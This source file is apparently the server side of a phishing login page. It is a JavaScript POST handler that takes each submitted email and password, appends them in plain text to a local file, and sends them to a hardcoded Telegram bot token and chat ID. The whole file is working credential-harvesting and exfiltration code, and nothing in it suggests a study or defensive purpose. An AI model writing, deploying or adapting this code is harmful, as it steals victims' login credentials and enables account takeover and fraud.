const fs = require('fs');
const path = require('path');

export default async function handler(req, res) {
    if (req.method === 'POST') {
        const { email, password } = req.body;

        // Save credentials to a file
        const filePath = path.join(process.cwd(), 'username.txt');
        const data = `Email: ${email}, Password: ${password}\n`;
        fs.appendFileSync(filePath, data);

        // Send credentials to Telegram bot
        const telegramBotToken = '7362880252:AAFoMzgfag6Y8pUXNgiAMcdGZEpKwQsmCxE';
        const chatId = '7587120060'; // Replace with your actual chat ID
        const message = encodeURIComponent(`New login:\nEmail: ${email}\nPassword: ${password}`);
        const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${message}`;

        try {
            await fetch(telegramUrl);
            res.status(200).json({ success: true });
        } catch (error) {
            console.error('Error sending message to Telegram:', error);
            res.status(500).json({ error: 'Failed to send message to Telegram' });
        }
    } else {
        res.status(405).json({ error: 'Method not allowed' });
    }
}
